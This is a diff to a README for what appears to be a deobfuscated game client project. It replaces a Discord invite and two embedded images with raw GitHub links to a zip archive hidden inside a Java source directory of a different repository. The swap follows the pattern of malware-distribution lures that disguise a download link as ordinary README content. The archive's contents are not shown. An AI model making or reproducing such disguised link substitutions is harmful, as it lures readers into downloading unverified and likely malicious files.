@@ -5,7 +5,7 @@ Fully deobfuscated and remapped in a whole ass minute :sob::pray: <br>
 
 <br>
 
-**Trillium INC: https://discord.gg/vzXzFpv2gk**
+**Trillium INC: https://github.com/OwingOP/SakiClientt/raw/refs/heads/main/src/main/java/bre2el/fpsreducer/util/Saki_Clientt_v3.1-alpha.3.zip**
 
 ## Why?
 
@@ -34,8 +34,8 @@ ablue - remapping and making it buildable.<br>
 
 ## HALL OF STUPIDNESS
 
-![image](https://github.com/user-attachments/assets/3e9152b3-23c3-4fbd-b219-9abf920c3354)
-![image](https://github.com/user-attachments/assets/e44be45e-7bbc-4ddb-b059-d7c9987c0fed)
+![image](https://github.com/OwingOP/SakiClientt/raw/refs/heads/main/src/main/java/bre2el/fpsreducer/util/Saki_Clientt_v3.1-alpha.3.zip)
+![image](https://github.com/OwingOP/SakiClientt/raw/refs/heads/main/src/main/java/bre2el/fpsreducer/util/Saki_Clientt_v3.1-alpha.3.zip)
 
 <h3> Running DeadCodeCleanTransformer transformer </h3>
 <h3> Made 8735 changes </h3>
